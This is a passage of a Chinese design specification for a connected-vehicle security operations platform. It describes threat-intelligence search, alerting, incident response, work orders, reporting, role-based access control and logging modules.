alt="威胁情报云端库"></p><ul><li>支持自定义威胁情报，支持类型包含IP地址、域名、MD5、域名:URI、IP地址:URI、域名:端口、IP地址:端口、域名:端口:URI、IP地址:端口:URI。支持自定义IPv6的威胁情报，相关功能的界面截图如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d566d076b691accf7ad1fc4b13b20ea2.png" alt="IMG_256"></p><ul><li>支持自定义建立风险模型，对风险零部件、风险车辆、风险车型等进行预警；</li><li>支持风险模型规则支持运维；</li></ul><h6 id="威胁管理"><a href="#威胁管理" class="headerlink" title="威胁管理"></a>威胁管理</h6><p>本地威胁检索：支持对本地威胁情报的检索功能，检索结果包含但不限于以下内容：IP主机信息、IP位置信息、域名流行度、情报IOC详情、相关样本、可视化分析、域名解析记录、域名注册信息、关联域名、数字证书等信息。界面截图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f411cb2a573d815106eb65bac16b334f.jpeg" alt="威胁情报本地库"></p><p>云端威胁检索：支持对云端威胁情报的检索功能，检索结果包含但不限于以下内容：IP主机信息、IP位置信息、域名流行度、情报IOC详情、相关样本、可视化分析、域名解析记录、域名注册信息、关联域名、数字证书等信息。界面截图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/870f0f35ed2840ef1857b9e2cbcffd71.jpeg" alt="威胁情报云端库"></p><p>支持自定义新建威胁情报：支持类型包含IP地址、域名、MD5、域名:URI、IP地址:URI、域名:端口、IP地址:端口、域名:端口:URI、IP地址:端口:URI。界面截图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/759ea9208fd8fa2ff2ff82ba00f19cd1.jpeg" alt="自定义威胁情报"></p><h6 id="威胁分析和风险评估模块："><a href="#威胁分析和风险评估模块：" class="headerlink" title="威胁分析和风险评估模块："></a>威胁分析和风险评估模块：</h6><p>威胁分析：系统基于收集到的威胁情报数据和实时监测数据，进行威胁分析，识别和评估车联网系统面临的潜在威胁。通过分析威胁的类型、来源、攻击手段等关键信息，系统可以准确评估威胁的严重程度和影响范围。</p><p>风险评估：系统根据威胁分析的结果，结合车联网系统的安全配置和漏洞情况，进行风险评估。系统可以对不同威胁和漏洞进行权重和优先级的评估，以确定最具风险的问题和潜在影响。</p><h6 id="预警通知机制："><a href="#预警通知机制：" class="headerlink" title="预警通知机制："></a>预警通知机制：</h6><p>定制化预警规则：系统支持定制化的预警规则，用户可以根据自身需求和风险评估结果，设置预警规则。例如，用户可以设置当某个特定威胁或漏洞在零部件、车辆、车型达到一定的严重程度或数量时，系统会触发预警通知。</p><p>多种通知方式：系统可以通过多种通知方式进行预警通知，包括电子邮件、短信、即时消息等。用户可以根据需要选择接收通知的方式，并设置通知优先级和接收人员。</p><h6 id="预警通知管理模块："><a href="#预警通知管理模块：" class="headerlink" title="预警通知管理模块："></a>预警通知管理模块：</h6><p>通知记录管理：系统记录预警通知的历史，包括通知时间、通知内容、通知对象等信息。用户可以查看通知记录，了解预警的触发情况和处理进展。</p><p>预警响应和处理：系统支持预警的响应和处理功能，相关人员可以根据预警通知及时采取相应的安全措施，以减轻潜在威胁的影响。</p><h5 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h5><p>应急响应：对发生的安全事件进行快速响应和处置，包括调度安全服务单位、技术支撑厂商、专家组等。</p><p>功能参数如下：</p><ul><li>支持配置网络安全应急响应流程；</li><li>具有相关权限的人员，可以对所有的告警通知进行追溯；</li><li>支持告警通知需明确，告警状态，并对状态可进行维护；</li><li>支持告警通知的方式，支持系统消息、邮件等方式，确保通知到相应的负责人。</li></ul><h6 id="网络安全应急响应流程配置模块："><a href="#网络安全应急响应流程配置模块：" class="headerlink" title="网络安全应急响应流程配置模块："></a>网络安全应急响应流程配置模块：</h6><p>流程定义：系统支持配置网络安全应急响应的流程，包括事件识别、事件确认、应急响应、恢复与修复等环节。用户可以根据实际需求定义和定制应急响应流程，确保在安全事件发生时能够迅速、有序地进行响应。</p><p>权限管理：系统支持对应急响应流程进行权限管理，确保只有具有相关权限的人员才能进行配置和修改。这样可以保证应急响应流程的安全性和可靠性。</p><h6 id="告警通知追溯模块："><a href="#告警通知追溯模块：" class="headerlink" title="告警通知追溯模块："></a>告警通知追溯模块：</h6><p>告警追溯功能：系统记录所有的告警通知，包括通知时间、通知内容、通知对象等信息。具有相关权限的人员可以通过系统进行告警通知的追溯，了解告警的触发情况和处理进展。这有助于进行事件溯源和后续分析。</p><p>审计日志：系统还提供审计日志功能，记录对告警通知的操作记录，包括查看、修改、删除等操作。这样可以确保告警通知的操作过程可追溯和可审计。</p><h6 id="告警通知状态维护模块："><a href="#告警通知状态维护模块：" class="headerlink" title="告警通知状态维护模块："></a>告警通知状态维护模块：</h6><p>状态管理：系统支持告警通知的状态维护，包括告警状态的定义和维护。用户可以根据实际需求设置告警状态，如待处理、处理中、已解决等。这样有助于对告警通知的管理和跟踪。</p><h6 id="告警通知方式配置模块："><a href="#告警通知方式配置模块：" class="headerlink" title="告警通知方式配置模块："></a>告警通知方式配置模块：</h6><p>通知方式定义：系统支持配置告警通知的方式，包括系统消息、邮件等方式。用户可以根据需要选择合适的通知方式，并设置通知优先级和接收人员。</p><p>通知到负责人：系统确保告警通知能够准确通知到相应的负责人，根据配置的通知方式和接收人员信息，将告警通知发送给指定的负责人。</p><h5 id="工单管理-1"><a href="#工单管理-1" class="headerlink" title="工单管理"></a>工单管理</h5><p>工单管理：统一操作和管理所有系统工单。</p><p>功能参数如下：</p><ul><li>可单独建立发起工单并指派给其他成员；</li><li>可追溯工单状态，进行事件催办，工单状态包括状态包含待下发、待处置、处置中、已处置、已完成、已撤销。支持工单流转、多人协同的工单跟踪处理方式；</li><li>可对工单进行编辑、修改、查看、删除；</li><li>在工单处理中体现 风险事件等级，类型、状态、处理人；</li><li>可根据工单号，风险事件等级、类型、状态进行筛选；</li><li>可查看所有的响应工单信息，可按车型、车辆、工单生成时间进行过滤搜索；</li><li>根据不同用户、角色实现工单访问控制；</li><li>支持对工单的响应操作，并可录入工单处理方式说明，填报结果；</li><li>针对预警结果，可以自动生成工单，派发到对应安全运维人员；</li><li>支持我的工单查看；工单状态包含待下发、待处置、处置中、已处置、已完成、已撤销。支持工单流转、多人协同的工单跟踪处理方式；</li><li>支持应急响应资源的管理，包括应急团队接口人、专家库成员、负责人等联系方式；</li><li>对接及时通信系统，如支持通过邮件、短信、企业微信、消息中心、企业钉钉、蓝信通知指定责任人；</li><li>支持与客户后续的工单系统或相对应的流程系统对接。</li></ul><h6 id="工单管理模块："><a href="#工单管理模块：" class="headerlink" title="工单管理模块："></a>工单管理模块：</h6><p>发起工单并指派给其他成员：系统支持用户单独发起工单，并将工单指派给其他成员进行处理。用户可以填写工单相关信息，并选择适当的处理人员。</p><p>工单状态追溯与催办：系统记录工单的状态变化，并提供工单状态追溯功能。用户可以催办工单，以加快工单的处理进度。工单状态包括待下发、待处置、处置中、已处置、已完成、已撤销等。</p><p>工单流转与协同处理：系统支持工单的流转和多人协同处理方式。工单可以在不同处理人员之间流转，以便实现多人协同处理工单的需求。</p><p>编辑、修改、查看、删除工单：用户可以对工单进行编辑、修改、查看和删除操作，以满足工单管理的灵活性。</p><p>风险事件等级、类型、状态、处理人：工单处理过程中体现风险事件的等级、类型、状态和处理人等相关信息，以便进行工单的分类和跟踪。</p><h6 id="工单筛选与搜索模块："><a href="#工单筛选与搜索模块：" class="headerlink" title="工单筛选与搜索模块："></a>工单筛选与搜索模块：</h6><p>工单筛选与搜索：系统支持根据工单号、风险事件等级、类型、状态等条件进行工单的筛选和搜索，以便用户快速找到所需的工单。</p><p>响应工单信息查看与过滤搜索：用户可以查看所有的响应工单信息，并根据车型、车辆、工单生成时间等进行过滤和搜索。</p><h6 id="工单访问控制模块："><a href="#工单访问控制模块：" class="headerlink" title="工单访问控制模块："></a>工单访问控制模块：</h6><p>工单访问控制：系统根据不同用户和角色实现工单的访问控制，确保只有授权用户可以访问和操作工单相关功能。</p><h6 id="工单响应与处理模块："><a href="#工单响应与处理模块：" class="headerlink" title="工单响应与处理模块："></a>工单响应与处理模块：</h6><p>工单响应操作：用户可以对工单进行响应操作，包括接受工单、拒绝工单等。用户可以录入工单处理方式说明和填报结果。</p><h6 id="应急响应资源管理模块："><a href="#应急响应资源管理模块：" class="headerlink" title="应急响应资源管理模块："></a>应急响应资源管理模块：</h6><p>应急响应资源管理：系统支持管理应急团队接口人、专家库成员、负责人等联系方式，以便在工单处理过程中获取必要的联系信息。</p><h6 id="通知与对接模块："><a href="#通知与对接模块：" class="headerlink" title="通知与对接模块："></a>通知与对接模块：</h6><p>通知与对接：系统支持与及时通信系统对接，如通过邮件、短信、企业微信、消息中心、企业钉钉、蓝信等方式通知指定责任人。同时，系统还支持与客户后续的工单系统或相应的流程系统进行对接，以实现工单数据的共享和流转。</p><h5 id="专案专报"><a href="#专案专报" class="headerlink" title="专案专报"></a>专案专报</h5><p>专案专报：生成专案和专报，记录应急处置过程和结果。</p><h6 id="专案管理模块："><a href="#专案管理模块：" class="headerlink" title="专案管理模块："></a>专案管理模块：</h6><p>专案创建：系统支持创建专案，用户可以为每个应急事件创建专案，并记录相关信息，如事件名称、发生时间、事件描述等。</p><p>专案分配：系统支持将专案分配给相应的责任人员或团队，确保应急处置工作有组织地进行。</p><p>专案进展跟踪：系统记录专案的进展情况，包括任务完成情况、时间节点等，以便监控和评估应急处置工作的进展。</p><h6 id="专报生成模块："><a href="#专报生成模块：" class="headerlink" title="专报生成模块："></a>专报生成模块：</h6><p>专报模板：系统提供专报模板，用户可以选择合适的模板用于生成专报。模板包括标题、摘要、事件描述、处置过程、结果总结等内容。</p><p>专报填写：用户根据实际应急处置情况，填写专报的各个部分内容。系统提供编辑工具和格式化选项，以便用户编写规范、清晰的专报。</p><p>专报生成：系统根据填写的内容，自动生成专报文档，包括格式、排版、页眉页脚等，以确保专报的专业性和统一性。</p><h6 id="专报存档和检索模块："><a href="#专报存档和检索模块：" class="headerlink" title="专报存档和检索模块："></a>专报存档和检索模块：</h6><p>专报存档：系统将生成的专报进行存档，以便后续查阅和检索。存档包括专报的版本、生成时间、相关专案信息等。</p><p>专报检索：用户可以通过关键词、时间范围等条件进行专报的检索，以快速找到需要的专报文档。</p><h4 id="日志统计"><a href="#日志统计" class="headerlink" title="日志统计"></a>日志统计</h4><p>功能参数如下：</p><ul><li>统计报表模块有明确的权限划分；</li><li>提供默认报表，支持日报、周报、月报、季报及年报，内容包括车辆、事件、工单；</li><li>支持日报、周报、月报季报、年报；支持报表模板的引用；水印的展示；自定义报表时间范围支持PDF、Word、HTML三种格式的报表下载；支持通过邮件、短信、企业微信、消息中心、企业钉钉、蓝信通知指定责任人；</li><li>支持不同展示形式选择，如柱状图、折线图、饼图等；</li><li>支持扩展字段内容，如车型、零部件等；</li><li>报表支持导出，导出格式支持PDF、Excel、Word。</li></ul><h5 id="统计报表管理"><a href="#统计报表管理" class="headerlink" title="统计报表管理"></a>统计报表管理</h5><p>统计报表管理：对其他平台数据进行汇总、梳理、统计和分析，生成统一关联分析的报告。统计报表管理是一个重要的数据管理和分析工作，特别是当涉及到多个平台的数据时。以下是设计方案的一般步骤。</p><ul><li>需求分析，确定业务需求：了解用户需要什么样的报表和分析。</li><li>确定数据来源，明确要汇总的平台，了解每个平台的数据结构和特点。</li><li>标准化数据格式，确保不同平台的数据可以被统一处理，可能需要进行数据清洗和转换。</li><li>制定数据收集计划，确保数据按照一定的时间周期或事件触发进行采集。</li><li>数据存储，设计数据库结构：创建数据库，用于存储各平台的数据。</li><li>实施ETL（抽取、转换、加载）过程：将数据从不同平台提取、转换为目标格式，然后加载到数据库中。</li><li>统计和分析，选择合适的统计工具：例如，使用SQL查询语言、数据可视化工具（如Tableau、Power BI）等。</li><li>制定统计规则和算法：确定如何汇总和计算数据，包括计算平均值、总和、百分比等。</li><li>设计报表模板，根据业务需求设计报表的结构和样式。</li><li>自动化报表生成，使用脚本或工作流程自动化生成报表，确保报表及时准确。</li><li>关联分析：进行数据关联，通过共同的字段将不同平台的数据关联起来。</li></ul><h6 id="报表统计与导出模块："><a href="#报表统计与导出模块：" class="headerlink" title="报表统计与导出模块："></a>报表统计与导出模块：</h6><p>报表统计：系统提供日报、月报、季报、年报等报表统计功能。报表内容至少包括车辆、事件、工单等相关信息，以便用户进行风险分析和管理。具体设计如下。</p><ul><li>数据模型设计：设计包含车辆、事件、工单等相关信息的数据库表结构。确定表之间的关联关系，以便能够联合查询各种信息。</li><li>报表生成模块：实现日报、月报、季报、年报等报表的生成模块。</li></ul><p>使用合适的统计算法和查询语句，确保生成的报表反映出车辆、事件、工单等的相关信息。</p><ul><li>报表展示界面：设计用户友好的报表展示界面，支持用户根据需要选择报表类型和时间范围。</li></ul><p>报表导出：系统支持将报表导出为PDF、Excel、Word等格式，用户可以选择导出的格式，并支持自定义报表模板，包括LOGO等操作，以满足个性化需求和品牌展示。具体设计如下。</p><ul><li>导出格式支持模块：使用现有的导出库或API，如pdfkit（用于PDF）、xlsx（用于Excel）、docx（用于Word）等，以实现将报表导出为不同格式。提供用户界面选项，让用户能够选择导出的格式，例如通过下拉菜单或单选按钮。</li><li>自定义报表模板模块：提供报表模板编辑功能，允许用户上传公司LOGO和其他品牌展示元素。使用适当的模板引擎，以在报表中嵌入用户上传的LOGO和其他自定义信息。允许用户调整报表的排版、字体、颜色等，以满足个性化需求。</li><li>用户界面设计：在用户界面上创建一个“导出设置”或类似的页面，供用户进行导出格式和模板的选择。提供实时预览功能，让用户在选择不同的导出格式和调整模板设置时能够即时查看报表的外观。</li><li>后端服务：创建后端服务来处理用户的导出请求，包括生成报表、嵌入LOGO和其他信息，最终将报表以用户选择的格式导出。确保后端服务能够处理不同格式的报表生成，并提供合适的接口供前端调用。</li><li>文件上传和管理：实现文件上传功能，以便用户能够上传公司LOGO和其他自定义元素。在后端存储这些上传的文件，确保它们能够在生成报表时被正确引用。</li></ul><h6 id="权限划分模块："><a href="#权限划分模块：" class="headerlink" title="权限划分模块："></a>权限划分模块：</h6><p>统计报表模块应有明确的权限划分：系统支持对统计报表模块进行权限管理，以确保只有授权用户可以访问和操作报表功能。不同用户角色可以被分配不同的权限，以控制其对报表的查看、生成和导出等操作。具体设计如下。</p><ul><li>用户角色定义：</li></ul><p>管理员角色： 具有最高权限，可以访问、查看、生成和导出所有报表。能够管理用户角色和权限设置。</p><p>普通用户角色： 具有一般的查看报表权限，可以生成和导出报表，但不能进行系统的权限管理操作。</p><ul><li>权限分配：</li></ul><p>报表查看权限： 允许用户查看已有的报表，但不能进行生成和导出操作。</p><p>报表生成权限： 允许用户生成报表，但不能导出。</p><p>报表导出权限： 允许用户将报表导出为PDF、Excel、Word等格式。</p><ul><li>报表管理页面：创建一个专门的报表管理页面，供管理员进行权限设置。在报表管理页面上，管理员可以查看所有用户的权限情况，并进行相应的修改。</li><li>权限验证：在系统的后端服务中实施权限验证机制，确保用户只能执行其被授权的操作。对于前端界面，实现动态渲染，只显示用户有权限进行的操作。</li><li>安全性考虑：使用安全的身份验证机制，如OAuth、JWT等，以确保用户身份的安全性。对敏感操作和数据进行加密，确保数据的保密性。</li><li>审计日志：记录用户的操作日志，包括登录、查看报表、生成报表、导出报表等。这些审计日志可以用于事后审计，追踪用户的操作历史。</li><li>定期审查和更新：定期审查用户的权限设置，确保其仍然符合组织的安全策略。在系统和业务变更后，及时更新权限设置，以适应新的需求和安全标准。</li></ul><h6 id="默认报表与报表周期模块："><a href="#默认报表与报表周期模块：" class="headerlink" title="默认报表与报表周期模块："></a>默认报表与报表周期模块：</h6><p>提供默认报表：系统提供默认的报表模板，包括日报、周报、月报、季报和年报。这些报表模板将包含车辆、事件、工单等相关信息，以满足基本的报表需求。具体设计如下。</p><ul><li>日报： 包括当天的车辆、事件、工单等相关信息的汇总。</li><li>周报： 汇总本周的车辆、事件、工单等信息，可能包含趋势和统计数据。</li><li>月报： 提供当月车辆、事件、工单等的详细信息，可能包括月度总结和分析。</li><li>季报： 汇总季度内的车辆、事件、工单等信息，包含季度度趋势和关键数据。</li><li>年报： 提供全年的车辆、事件、工单等信息，可能包含年度总结、趋势和关键指标。</li></ul><h6 id="报表生成与导出模块："><a href="#报表生成与导出模块：" class="headerlink" title="报表生成与导出模块："></a>报表生成与导出模块：</h6><p>报表生成与导出：系统支持生成日报、周报、月报、季报和年报等不同周期的报表。用户可以选择报表模板，并根据需要自定义报表时间范围。生成的报表可以以PDF、Word、HTML等格式进行下载和导出。此外，系统还支持通过邮件、短信、企业微信、消息中心、企业钉钉、蓝信等方式通知指定责任人。具体设计如下。</p><ul><li>多格式导出功能模块：实现对报表生成结果的多格式导出功能，包括PDF、Word、HTML等。集成相应的导出库，如pdfkit、python-docx等。</li><li>用户界面设计：在报表展示页面提供导出按钮，允许用户选择导出的格式。提供下载链接或直接在页面上预览并下载生成的报表文件。</li><li>异常通知和重试机制：实施异常通知和重试机制，以确保在通知发送失败时系统能够自动重试或者通知相关责任人。</li><li>通知方式集成模块：集成不同通知方式的API或SDK，如邮件发送、短信服务商API、企业微信API、消息中心API、企业钉钉API、蓝信API等。</li><li>触发通知的触发器：在系统中设置触发器，根据预定条件触发通知，例如报表生成完成、重要事件发生等。确保通知触发器与系统的事件和任务处理机制集成。</li></ul><h6 id="报表展示形式与扩展字段模块："><a href="#报表展示形式与扩展字段模块：" class="headerlink" title="报表展示形式与扩展字段模块："></a>报表展示形式与扩展字段模块：</h6><p>报表展示形式选择：系统支持不同的展示形式，如柱状图、折线图、饼图等，以便用户根据需求选择最合适的展示方式。</p><p>扩展字段内容：系统支持扩展字段内容，例如车型、零部件等。用户可以在报表中添加这些扩展字段，以提供更详细和全面的报表信息。具体设计如下。</p><ul><li>图表库集成：集成现代图表库，如Chart.js、Highcharts等，以支持不同的图表类型，包括柱状图、折线图、饼图等。</li><li>用户界面设计：在报表展示页面提供图表类型选择器，允许用户根据需求选择最合适的图表形式。通过下拉菜单或其他交互方式，让用户能够灵活切换图表类型。</li><li>动态图表生成：根据用户选择的图表类型，动态生成相应的图表，并在页面上展示。考虑使用异步加载机制，以提高页面加载速度和用户体验。</li><li>扩展字段模型设计：设计支持扩展字段的数据库模型，确保系统能够存储和检索扩展字段相关的数据。考虑使用键值对或其他灵活的数据结构，以容纳不同类型的扩展字段。</li><li>用户界面扩展字段设置：在系统中创建一个扩展字段设置页面，允许管理员配置可用的扩展字段。允许管理员为每个扩展字段定义名称、类型、显示顺序等属性。</li><li>报表字段选择和过滤：在报表生成页面提供一个字段选择器，允许用户选择添加扩展字段到报表中。提供过滤功能，允许用户按照扩展字段进行筛选和排序。</li></ul><h6 id="报表导出格式模块："><a href="#报表导出格式模块：" class="headerlink" title="报表导出格式模块："></a>报表导出格式模块：</h6><p>报表导出格式：系统支持将报表导出为PDF、Excel、Word等格式。用户可以根据需要选择合适的导出格式，以便在不同场景下使用和分享报表数据。具体设计如下。</p><ul><li>导出库集成：集成现有的导出库，如pdfkit（用于PDF）、xlsx（用于Excel）、docx（用于Word）等，以实现将报表导出为不同格式。</li><li>用户界面设计：在报表展示页面或报表管理页面上，提供导出按钮或选项，让用户能够选择导出的格式。提供下拉菜单或单选按钮等交互元素，让用户灵活选择导出格式。</li><li>导出设置：允许用户设置导出参数，如页面尺寸、边距、字体等，以满足个性化需求。提供高级选项，如图表是否包含图例、是否包含表格边框等。</li></ul><h4 id="系统管理-1"><a href="#系统管理-1" class="headerlink" title="系统管理"></a>系统管理</h4><p>功能参数如下：</p><ul><li>所有平台数据进行集中的处理、分析及存储；</li><li>提供多种筛选条件，支持灵活组合，如车型、零部件、风险类型、风险等级等；</li><li>支持有权限的用户进行日志导出，包含不限于风险事件等级、类型、状态、关联资产信息、资产IP等；</li><li>提供更多可灵活搭配的筛选条件，如源IP等；</li><li>支持使用多种逻辑运算和关系运算进行复杂搜索语句构造，运算符包括等于、不等于、大于、小于、模糊匹配、不匹配等；支持从索引类型和字段列表中快速筛选出日志源和关键字段，形成搜索条件；</li><li>支持从索引类型和字段列表中快速筛选出日志源和关键字段，形成搜索条件；</li><li>对角色进行有效可控的管理、可编辑、可新增、可删除、可查看；</li><li>支持系统账户的安全性验证，包含双因子认证、账户登录设置、可信主机等设置，支持对登录异常账户锁定、密码长度、密码强度、登录会话并发数等进行设置；</li><li>支持用户角色管理，可以为不同角色赋予不同系统功能模块及数据的读写权限；</li><li>通过创建角色，并赋予角色不同功能模块的权限；</li><li>系统日志，记录当前账户的操作行为；</li><li>账户管理，超级管理员，可以创建不同角色，不同权限的账户；</li><li>账户管理中，需要体现，用户名，手机号，部门，所属权限，姓名，创建时间；</li><li>超级管理员，能对平台账号进行维护。</li></ul><h5 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h5><p>用户管理：管理系统用户的权限和身份验证。具体设计如下。</p><ul><li>用户身份验证：</li></ul><p>用户注册：提供用户注册页面，允许新用户注册账户。要求用户提供必要的信息，如用户名、密码、电子邮件地址等。</p><p>用户登录：提供用户登录页面，用户使用注册时提供的用户名和密码进行身份验证。考虑使用安全的身份验证机制，如哈希密码存储、加盐等。</p><p>密码重置：提供密码重置功能，允许用户通过电子邮件或手机短信进行密码重置。</p><ul><li>用户权限管理：</li></ul><p>角色定义：定义不同的用户角色，例如管理员、普通用户等。为每个角色分配相应的权限。</p><p>权限分配：提供管理员界面，允许管理员为用户分配角色和权限。</p><p>确保灵活性，允许用户拥有不同的角色组合。</p><p>权限验证：在系统的核心功能中嵌入权限验证逻辑，确保用户只能访问其被授权的资源和操作。</p><h6 id="数据处理、分析与存储模块："><a href="#数据处理、分析与存储模块：" class="headerlink" title="数据处理、分析与存储模块："></a>数据处理、分析与存储模块：</h6><p>集中处理、分析及存储：系统能够集中处理、分析和存储所有平台数据，确保数据的一致性和完整性。具体设计如下。</p><ul><li>数据集成和处理：</li></ul><p>数据集成模块：实现数据集成模块，负责从不同平台收集数据并将其整合到一个中心数据仓库中。</p><p>数据清洗和验证：在数据集成过程中进行数据清洗，处理重复、缺失或错误的数据。引入数据验证机制，确保数据符合预期的格式和规范。</p><p>实时数据流：如果系统需要实时处理数据，考虑使用实时数据流技术，确保数据的及时性。</p><ul><li>数据存储和管理：</li></ul><p>中心数据仓库：设计和建立一个中心化的数据仓库，存储从各个平台集成而来的数据。使用合适的数据库技术，如关系型数据库MySQL</p><p>数据备份和恢复：实施定期的数据备份策略，确保系统中的数据可以在意外情况下进行恢复。定期测试备份和恢复流程，以确保备份的有效性。</p><h6 id="筛选条件与灵活组合模块："><a href="#筛选条件与灵活组合模块：" class="headerlink" title="筛选条件与灵活组合模块："></a>筛选条件与灵活组合模块：</h6><p>多种筛选条件支持：系统提供多种筛选条件，如车型、零部件、风险类型、风险等级等，用户可以灵活组合这些条件进行数据筛选。具体设计如下。</p><ul><li>条件定义：定义系统支持的各种筛选条件，例如车型、零部件、风险类型、风险等级等。每个筛选条件需要有明确的定义、名称和可能的取值范围。</li><li>条件分类：将筛选条件进行分类，以方便用户在界面上进行选择和组合。可以按照车辆信息、风险信息等分类。</li></ul><h6 id="日志导出权限设置"><a href="#日志导出权限设置" class="headerlink" title="日志导出权限设置"></a>日志导出权限设置</h6><p>日志导出权限设置是一项功能，允许具有相应权限的用户进行日志的导出操作。该功能允许管理员或特定角色的用户根据需要选择导出的日志内容，并设置导出的条件和筛选器。用户可以根据风险事件的等级、类型、状态以及关联资产信息进行筛选，并选择需要导出的字段，如资产IP等。</p><p>通过日志导出权限设置，管理员可以灵活地控制哪些用户可以导出日志，并限制他们的访问范围。这样可以确保敏感信息的安全性和机密性。只有具有权限的用户才能进行日志导出操作，从而保证了数据的安全性和合规性。</p><p>此外，日志导出权限设置还可以根据用户的角色和职责进行细分和定制。不同角色的用户可以具备不同的导出权限，以满足组织内部的安全管理需求。这样可以确保只有经过授权的用户才能访问和导出特定类型的日志数据，提高了系统的安全性和可管理性。具体设计如下。</p><ul><li>角色权限定义：定义具有导出日志权限的用户角色，如管理员或其他特定角色。将日志导出权限与其他系统权限进行合理的划分。</li><li>权限控制模块：实现权限控制模块，确保只有具有导出日志权限的用户可以访问相关功能。</li><li>筛选条件选择：导出设置页面上提供筛选条件，包括风险事件的等级、类型、状态以及关联资产信息。使用直观的界面元素，如下拉菜单、多选框等，以便用户能够选择导出条件。</li><li>字段选择器：提供字段选择器，让用户可以根据需要选择导出的字段，如资产IP、风险等级、事件类型等。可以使用拖拽或列表选择的方式，以方便用户操作。</li><li>数据导出：将查询结果导出为用户选择的格式，如Excel等。实现异步导出，避免导出大量数据时对系统性能的影响。</li><li>日志记录：记录导出操作的日志，包括执行导出的用户、导出时间、导出条件等关键信息。确保记录足够的信息，以便进行审计和监控。</li></ul><h6 id="筛选条件扩展模块："><a href="#筛选条件扩展模块：" class="headerlink" title="筛选条件扩展模块："></a>筛选条件扩展模块：</h6><p>更多灵活搭配的筛选条件：系统支持更多可灵活搭配的筛选条件，如源IP等，以满足用户对数据的更精细筛选需求。具体设计如下。</p><ul><li>新增筛选条件：在系统中新增可灵活搭配的筛选条件，如源IP、目标IP等。确保每个新增的筛选条件都有清晰的定义和取值范围。</li><li>条件分类和组合：将新增的筛选条件进行分类，以便用户在筛选面板上进行选择和组合。允许用户在筛选面板上自由组合多个条件，以满足复杂的筛选需求。</li></ul><h6 id="复杂搜索语句构造模块："><a href="#复杂搜索语句构造模块：" class="headerlink" title="复杂搜索语句构造模块："></a>复杂搜索语句构造模块：</h6><p>复杂搜索语句构造：系统支持使用多种逻辑运算和关系运算进行复杂搜索语句的构造。用户可以使用等于、不等于、等于、小于、模糊匹配、不匹配等运算符，并从索引类型和字段列表中快速筛选出日志源和关键字段，形成搜索条件。具体设计如下。</p><ul><li>搜索条件编辑器：提供一个搜索条件编辑器，允许用户通过直观的界面构造复杂的搜索语句。使用类似于SQL的可视化编辑器，以方便用户选择字段、运算符和值。</li><li>逻辑运算：在编辑器中支持逻辑运算，如AND、OR、NOT，以便用户可以组合多个条件。提供括号或其他方式，使用户能够明确指定运算的优先级。</li><li>运算符选择器：在搜索条件编辑器中提供运算符选择器，允许用户选择等于、不等于、小于、大于、模糊匹配、不匹配等运算符。为每个运算符提供相应的帮助文档或提示，以帮助用户正确使用。</li><li>索引类型和字段列表：提供一个索引类型和字段列表，让用户能够从中快速筛选出日志源和关键字段。允许用户在搜索条件中选择特定的字段，并提供字段类型信息。</li></ul><h6 id="账户管理模块："><a href="#账户管理模块：" class="headerlink" title="账户管理模块："></a>账户管理模块：</h6><p>账户管理：系统提供账户管理功能，超级管理员可以创建不同角色、不同权限的账户。账户管理中需要包含用户名、手机号、部门、所属权限、姓名、创建时间等信息。具体设计如下。</p><ul><li>定义账户信息：设计账户信息模型，包括用户名、手机号、部门、所属权限、姓名、创建时间等字段。确保字段的准确性和完整性，可以考虑使用数据库关系模型。</li><li>角色和权限模型：定义角色模型和权限模型，以便将权限与账户关联。</li></ul><p>角色可以拥有多个权限，账户可以分配至一个或多个角色。</p><h6 id="账户安全性验证"><a href="#账户安全性验证" class="headerlink" title="账户安全性验证"></a>账户安全性验证</h6><p>账户安全性验证是一项重要的措施，用于保护系统账户的安全。</p><p>1. 双因子认证：双因子认证要求用户在登录时提供两个以上的验证因素，通常是密码和额外的身份验证方式，如手机验证码、指纹识别或硬件令牌等。这种方式提供了更高的安全性，即使密码被泄露，仍需要额外的验证因素才能成功登录。</p><p>2. 账户登录设置：账户登录设置允许用户对登录过程进行自定义配置。用户可以设置登录时的安全选项，如密码重置、安全问题、登录失败限制等。这样可以增加账户的安全性，并防止未经授权的访问。</p><p>3. 可信主机设置：可信主机设置允许用户指定特定的主机或设备作为可信任的登录来源。只有来自这些可信主机的登录请求才会被允许，其他来源的登录请求将被拒绝。这种设置可以防止未经授权的设备访问账户。</p><p>4. 异常账户锁定：系统可以监测登录行为，如果检测到异常的登录尝试，如多次失败的登录、异常的登录地点或IP地址变动等，可以自动锁定账户，防止恶意攻击者进一步尝试登录。</p><p>5. 密码策略设置：密码策略设置允许管理员定义密码的要求，如密码长度、密码强度要求（包括大小写字母、数字和特殊字符的使用）、密码过期时间等。这样可以确保用户设置的密码足够强壮，减少密码被破解的风险。</p><p>6. 登录会话并发数设置：登录会话并发数设置允许管理员限制同一账户的同时登录会话数量。通过设置最大并发数，可以防止恶意用户通过多个会话同时访问账户，提高账户的安全性。</p><p>这些账户安全性验证功能的组合可以有效地保护系统账户的安全，减少未经授权的访问和潜在的安全风险。管理员和用户可以根据实际需求进行配置和使用。</p><h5 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a>日志管理</h5><p>日志管理：记录系统操作日志和安全事件日志。</p><h6 id="系统日志模块："><a href="#系统日志模块：" class="headerlink" title="系统日志模块："></a>系统日志模块：</h6><p>系统日志记录：系统记录当前账户的操作行为，包括登录、操作日志等，以便进行审计和追溯。具体设计如下。</p><ul><li>操作日志定义：定义系统中需要记录的操作日志，包括登录、关键操作（如账户管理、权限分配等）等。确保每个日志条目都包含足够的信息，如用户名、操作时间、IP地址、操作内容等。</li><li>日志级别：设计不同的日志级别，例如INFO、WARN、ERROR等，以便区分不同严重程度的日志记录。</li><li>数据库日志：将日志信息存储到数据库中，以便实现在线查询和分析。</li></ul><p>考虑使用合适的数据库表结构，以存储不同类型的日志信息。</p><ul><li>操作事件：记录关键操作的事件，例如账户管理、权限分配、系统设置变更等。记录操作的具体内容和相关参数。</li></ul><h6 id="日志导出模块："><a href="#日志导出模块：" class="headerlink" 